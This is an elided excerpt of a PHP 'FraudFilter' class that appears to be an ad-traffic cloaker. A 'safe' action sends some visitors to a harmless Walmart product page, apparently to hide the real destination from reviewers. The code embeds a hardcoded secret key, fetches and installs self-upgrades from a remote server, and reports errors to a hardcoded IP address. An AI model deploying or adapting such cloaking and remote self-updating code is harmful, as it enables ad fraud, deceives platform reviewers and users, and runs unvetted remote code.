...
class FraudFilterDetector_ftfkg {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'e3aa2dd9-f628-49fb-93df-17ed4693c103.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.walmart.com/ip/Double-Heart-Love-White-CZ-Promise-Ring-Sizes-5-6-7-8-9-10-New-925-Sterling-Silver-Band-Rings-by-Sac-Silver-Size-7/138265863');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: e3aa2dd9-f628-49fb-93df-17ed4693c103',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: e3aa2dd9-f628-49fb-93df-17ed4693c103';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: e3aa2dd9-f628-49fb-93df-17ed4693c103';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ftfkg&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ftfkg = new FraudFilterDetector_ftfkg();
$fraudFilterDetector_ftfkg->check();
